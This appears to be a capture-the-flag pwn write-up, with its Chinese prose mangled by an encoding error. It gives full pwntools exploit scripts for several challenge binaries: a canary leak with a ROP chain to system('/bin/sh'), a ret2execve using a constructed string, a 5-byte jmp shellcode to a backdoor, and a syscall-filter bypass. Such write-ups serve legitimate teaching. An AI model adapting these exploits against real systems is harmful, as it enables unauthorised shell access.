class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./little_canary&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.101&quot;</span></span><br><span class="line">    port = <span class="number">64352</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r(<span class="built_in">len</span>(payload))</span><br><span class="line">leak_canary = <span class="string">b&#x27;\x00&#x27;</span> + r(<span class="number">7</span>)</span><br><span class="line">success(leak_canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x0000000000401343</span></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span>),leak_canary,<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>,</span><br><span class="line">    rdi,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&quot;I put a canary on my stack!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_addr = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># libc_base = leak_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,leak_addr)</span><br><span class="line">libc_base = leak_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line"><span class="comment"># system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x50</span> - <span class="number">8</span>),leak_canary,<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>,</span><br><span class="line">    ret,rdi,binsh,system</span><br><span class="line"></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What&#x27;s your name?\n&quot;</span>,payload)</span><br><span class="line">sa(<span class="string">b&quot;I put a canary on my stack!\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="rePWNse-è¡¥"><a href="#rePWNse-è¡¥" class="headerlink" title="rePWNse[è¡¥]"></a>rePWNse[è¡¥]</h2><p>é¢˜ç›®ä¸­æœ‰ç»™ è®¾ç½®å¥½çš„execveçš„æ¨¡æ¿ï¼Œæœ‰pop rdi retçš„gadgetï¼Œä½†æ˜¯æ²¡æœ‰binshå­—ç¬¦ä¸²ï¼Œéœ€è¦åœ¨makebinshä¸­æ„é€ ä¸€ä¸ªbinshå­—ç¬¦ä¸²ã€‚</p>
<p>è¿™ä¸ªmakebinshå‡½æ•°ç¬¬ä¸€çœ¼çœ‹è§‰å¾—æŒºå¤æ‚çš„ï¼Œä½†æ˜¯ç»†çœ‹ä¼šå‘ç°å°±æ˜¯ä¸€ä¸ªä¸€å…ƒä¸€æ¬¡æ–¹ç¨‹çš„çº¦æŸæ±‚è§£ï¼Œå…¶ä¸­æœ‰ä¸€äº› strncat((char *)s, &amp;src[v7[1]], 1uLL); é€šè¿‡v7[i] æ¥åšä¸‹æ ‡çš„è¡¨è¾¾å¼ï¼Œæ˜¯å¯ä»¥ç›´æ¥çœ‹å‡ºv7[i]çš„å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">__int64 makebinsh()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v0; // eax</span><br><span class="line">  <span class="built_in">int</span> v1; // eax</span><br><span class="line">  <span class="built_in">int</span> v2; // eax</span><br><span class="line">  <span class="built_in">int</span> v3; // eax</span><br><span class="line">  <span class="built_in">int</span> v4; // eax</span><br><span class="line">  <span class="built_in">int</span> v5; // eax</span><br><span class="line">  <span class="built_in">int</span> v7[<span class="number">8</span>]; // [rsp+0h] [rbp-70h] BYREF</span><br><span class="line">  char src[<span class="number">64</span>]; // [rsp+20h] [rbp-50h] BYREF</span><br><span class="line">  void *s; // [rsp+60h] [rbp-10h]</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+6Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  strcpy(src, <span class="string">&quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);</span><br><span class="line">  s = malloc(8uLL);</span><br><span class="line">  memset(s, <span class="number">0</span>, 8uLL);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  puts(<span class="string">&quot;Input seven single digits:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7[i]);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">3</span>] * v7[<span class="number">1</span>] == <span class="number">10</span> * v7[<span class="number">4</span>] + v7[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, src, 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v1 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">5</span>] == v7[<span class="number">6</span>] + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">2</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v2 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  strncat((char *)s, &amp;src[v7[<span class="number">1</span>]], 1uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">1</span>] == v7[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">14</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v3 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  strncat((char *)s, &amp;src[v7[<span class="number">6</span>]], 1uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">0</span>] == v7[<span class="number">2</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">19</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v4 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">3</span>] - v7[<span class="number">4</span>] == v7[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    strncat((char *)s, &amp;src[<span class="number">8</span>], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = rand();</span><br><span class="line">    strncat((char *)s, &amp;src[(<span class="built_in">int</span>)(<span class="number">53.0</span> * ((double)v5 / <span class="number">2147483647.0</span>))], 1uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">&quot;Here&#x27;s the string:%s\n&quot;</span>, (const char *)s);</span><br><span class="line">  printf(<span class="string">&quot;The address is:%p\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§çº¦æ˜¯è¿™äº›çº¦æŸï¼Œç®—äº†ä¸€ä¸‹ å¾—å‡ºçš„v7[]çš„ç»“æœæ˜¯ 1919810</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot;/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[3] * v7[1] == 10 * v7[4] + v7[5]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[5] == v7[6] + 1</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># strncat((char *)s, &amp;src[v7[1]], 1uLL); v7[1] == 9</span></span><br><span class="line"><span class="comment"># print(str.find(&#x27;i&#x27;))</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="built_in">str</span>.find(<span class="string">&#x27;i&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[1] == v7[3] v7[3] == 9</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">14</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># strncat((char *)s, &amp;src[v7[6]], 1uLL); v7[6] == 0</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[0] == v7[2]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">19</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># v7[3] - v7[4] == v7[0]</span></span><br><span class="line">result += <span class="built_in">str</span>[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./rePWNse&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.1.102&quot;</span></span><br><span class="line">    port = <span class="number">49704</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input seven single digits:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="literal">None</span>] * <span class="number">7</span></span><br><span class="line">v7[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">1</span>] = <span class="number">9</span></span><br><span class="line">v7[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">3</span>] = <span class="number">9</span></span><br><span class="line">v7[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">v7[<span class="number">5</span>] = <span class="number">1</span></span><br><span class="line">v7[<span class="number">6</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    sl(<span class="built_in">str</span>(v7[i]).encode())</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;The address is:&quot;</span>)</span><br><span class="line">binsh = <span class="built_in">int</span>(rl()[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x000000000040168e</span></span><br><span class="line">execve = <span class="number">0x40129B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x40</span> + <span class="number">0x8</span>),</span><br><span class="line">    rdi,binsh,execve</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellcode-level3-è¡¥"><a href="#shellcode-level3-è¡¥" class="headerlink" title="shellcode_level3[è¡¥]"></a>shellcode_level3[è¡¥]</h2><p>gets(code) è¾“å…¥çš„ä½ç½®ï¼Œåªæœ‰å‰äº”ä¸ªå­—èŠ‚æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œæœ‰ä¸€ä¸ªbackdoor functionï¼Œjmp è¿‡å»å°±å¥½äº†ï¼Œ jmpçš„å­—èŠ‚ç æ˜¯e9ï¼Œç›¸å¯¹å¯»å€(rip) åé¢è·Ÿçš„æ˜¯ä¸€ä¸ªåç§»åœ°å€ï¼Œç®—ä¸€ä¸‹codeçš„åœ°å€åˆ°backdoorçš„åç§»æ˜¯å¤šå°‘ï¼Œè½¬æ¢æˆè¡¥ç å°±å¥½äº†ï¼Œæ³¨æ„ä¸€ä¸‹ç«¯åºæ˜¯å°ç«¯åº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5 bytes ni neng miao sha wo?&quot;</span>);</span><br><span class="line">  mprotect(&amp;GLOBAL_OFFSET_TABLE_, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  gets(&amp;code);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;unk_40408E, <span class="number">0</span>, <span class="number">0xF72</span>uLL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))code)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">givemeshell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./shellcode_level3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;192.168.94.193&quot;</span></span><br><span class="line">    port = <span class="number">57295</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 40408E - 4011D6 = 11960 # -11960çš„è¡¥ç æ˜¯ 48d1ffff, å°ç«¯åº</span></span><br><span class="line">shellcode = <span class="string">b&quot;\xe9\x48\xd1\xff\xff&quot;</span></span><br><span class="line">sl(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="changeable-shellcode-è¡¥"><a href="#changeable-shellcode-è¡¥" class="headerlink" title="changeable_shellcode [è¡¥]"></a>changeable_shellcode [è¡¥]</h2><p>æœ‰ä¸€ä¸ªfilterå‡½æ•°ï¼ŒæŠŠsyscallç»™è¿‡æ»¤äº†ï¼Œé‚£èƒ½ä¸èƒ½åœ¨shellcodeä¸­ï¼Œé€ ä¸€ä¸ªsyscallå‡ºæ¥ï¼Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">filter</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="number">15</span> &amp;&amp; buf[i + <span class="number">1</span>] == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Is that &#x27;syscall&#x27;?&quot;</span>);</span><br><span class="line">      buf[i] = <span class="number">0</span>;</span><br><span class="line">      buf[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oh, nothing.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bâ€™\x0f\x00â€™ï¼ŒæŠŠ\x00ä¿®æ”¹æˆ 05å°±æ˜¯syscallçš„å­—èŠ‚ç äº†ï¼Œè¿™ä¸ªåç§»å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²é•¿åº¦æ¥ç®—ï¼Œå› ä¸º00æ˜¯åœ¨ç»“å°¾çš„ len -1 å°±æ˜¯åç§»äº†</p>
